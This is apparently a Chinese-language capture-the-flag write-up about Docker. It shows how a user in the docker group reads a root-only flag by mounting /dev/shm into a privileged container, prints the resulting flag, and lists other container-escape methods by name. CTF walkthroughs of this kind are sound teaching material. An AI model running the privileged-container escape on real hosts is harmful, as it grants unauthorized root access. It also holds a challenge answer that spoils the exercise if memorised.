# Docker for everyone

## 0x00 First sight

你有一个 Linux Shell，你应该可以看到这样的启动日志：

```bash

   OpenRC 0.48 is starting up Linux 6.1.55-0-virt (x86_64)

 * /proc is already mounted
 * Mounting /run ... [ ok ]
 * /run/openrc: creating directory
 * /run/lock: creating directory
 * /run/lock: correcting owner
 * Caching service dependencies ... [ ok ]
 * Remounting devtmpfs on /dev ... [ ok ]
 * Mounting /dev/mqueue ... [ ok ]
 * Mounting security filesystem ... [ ok ]
 * Mounting debug filesystem ... [ ok ]
 * Mounting persistent storage (pstore) filesystem ... [ ok ]
 * Starting busybox mdev ... [ ok ]
 * Scanning hardware for mdev ... [ ok ]
 * Loading modules ... [ ok ]
 * Setting system clock using the hardware clock [UTC] ... [ ok ]
 * Checking local filesystems  ...fsck.ext4: Operation not permitted while trying to open /dev/vda3
You must have r/w access to the filesystem or be root
 * Operational error
 [ !! ]
 * Remounting root filesystem read/write ...mount: mounting /dev/vda3 on / failed: Permission denied
 * Root filesystem could not be mounted read/write
 [ !! ]
 * Remounting filesystems ... [ ok ]
dd: error writing '/dev/vdb': No space left on device
2+0 records in
1+0 records out
 * Mounting local filesystems ... [ ok ]
 * Configuring kernel parameters ... [ ok ]
 * / is not writable; unable to clean up underlying /run
 * Creating user login records .../lib/rc/sh/openrc-run.sh: line 100: can't create /var/log/wtmp: Ream
 * ERROR: bootmisc failed to start
 * Setting hostname ... [ ok ]
 * / is not writable; unable to clean up underlying /run
 * Creating user login records .../lib/rc/sh/openrc-run.sh: line 100: can't create /var/log/wtmp: Ream
 * ERROR: bootmisc failed to start
 * Mounting cgroup filesystem ... [ ok ]
 * Starting networking ... *   lo ... [ ok ]
 * /tmp/docker-err.log: creating file
 * /tmp/docker-err.log: correcting owner
 * /tmp/docker-out.log: creating file
 * /tmp/docker-out.log: correcting owner
 * Starting Docker Daemon ... [ ok ]

Welcome to Alpine Linux 3.18
Kernel 6.1.55-0-virt on an x86_64 (ttyS0)

alpine login: hg (automatic login)

可以使用以下命令体验 alpine 容器:

docker run -it --rm alpine
等待 Docker 守护进程
正在加载 Docker Alpine 容器镜像
0e182002b05f: Loading layer  5.828MB/5.828MB
Loaded image: alpine:latest
alpine:~$ 
```

可以看到你的shell其实是一个跑在虚拟机上的docker容器。

## 0x01 Get the flag

你知道flag在这里：

```bash
alpine:/$ ls -alh flag
lrwxrwxrwx    1 root     root          13 Oct  8 12:10 flag -> /dev/shm/flag
alpine:/$ ls -alh /dev/shm/flag
-r--------    1 root     root         512 Nov 20 11:53 /dev/shm/flag
alpine:/$ 

```

看到权限是所有者可读（400），当前用户是hg，在当前环境中是无法直接读取的。

这里需要在容器内提权。看看有没有docker：

```bash
alpine:/$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    187eae39ad94   3 months ago   5.54MB
```

好像可以，尝试用特权容器提权：

```bash
alpine:~$ docker run -v /dev/shm:/dev/shm --privileged -it alpine
/ # cat /dev/shm/flag 
flag{u5e_r00t1ess_conta1ner_dd77f3e15b_plz!}
```

到手了。

## 0x02 What the heck

这个叫容器逃逸。一般情况下有这些方法：

- Docker 特权模式逃逸 （本文方法）
- docker.sock 挂载逃逸
- Remote API (Docker swarm)
- 低版本的RunC/Docker漏洞
- Dirty Cow

具体请STW，这里不再赘述。
